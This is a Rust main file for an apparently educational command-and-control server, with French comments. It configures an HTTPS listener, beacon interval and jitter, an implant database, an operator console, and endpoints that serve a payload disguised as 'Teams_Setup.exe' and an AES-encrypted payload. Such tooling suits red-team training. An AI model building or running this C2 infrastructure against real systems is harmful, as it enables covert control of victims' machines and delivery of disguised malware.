mod console;
mod crypto;
mod framing;
mod models;
mod server;
mod store;

use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
#[command(name = "controller", about = "Framework C2 pédagogique s0P0wn3d")]
struct Args {
    /// Port d'écoute HTTPS
    #[arg(long, default_value_t = 8443)]
    port: u16,

    /// Interface d'écoute
    #[arg(long, default_value = "0.0.0.0")]
    bind: String,

    /// Intervalle de beacon par défaut (secondes)
    #[arg(long, default_value_t = 30)]
    interval: u32,

    /// Jitter de beacon par défaut (fraction, ex: 0.3 = ±30 %)
    #[arg(long, default_value_t = 0.3)]
    jitter: f64,

    /// Chemin de la base SQLite
    #[arg(long, default_value = "c2.db")]
    db: PathBuf,

    /// Certificat TLS (PEM)
    #[arg(long, default_value = "certs/server.crt")]
    cert: PathBuf,

    /// Clé privée TLS (PEM)
    #[arg(long, default_value = "certs/server.key")]
    key: PathBuf,

    /// Lance sans console interactive
    #[arg(long)]
    headless: bool,

    /// Fichier à servir via /dl (ex: Teams_Setup.exe)
    #[arg(long)]
    payload: Option<PathBuf>,

    /// Payload AES-chiffré à servir via /dl2 (ex: payload.bin)
    #[arg(long)]
    payload2: Option<PathBuf>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    let store = Arc::new(Mutex::new(store::Store::open(&args.db)?));

    let private_key = {
        let pem = std::fs::read(&args.key)?;
        Arc::new(crypto::load_private(&pem)?)
    };

    let state = server::AppState {
        store: store.clone(),
        private_key,
        interval: args.interval,
        jitter: args.jitter,
        payload: args.payload,
        payload2: args.payload2,
    };

    let addr: SocketAddr = format!("{}:{}", args.bind, args.port).parse()?;
    println!("[*] écoute sur https://{}", addr);

    if args.headless {
        server::serve(state, addr, args.cert, args.key).await
    } else {
        let cert = args.cert.clone();
        let key = args.key.clone();
        tokio::spawn(async move {
            if let Err(e) = server::serve(state, addr, cert, key).await {
                eprintln!("[!] serveur arrêté : {}", e);
            }
        });
        // La console bloque dans le thread principal.
        tokio::task::spawn_blocking(move || console::run(store))
            .await??;
        Ok(())
    }
}
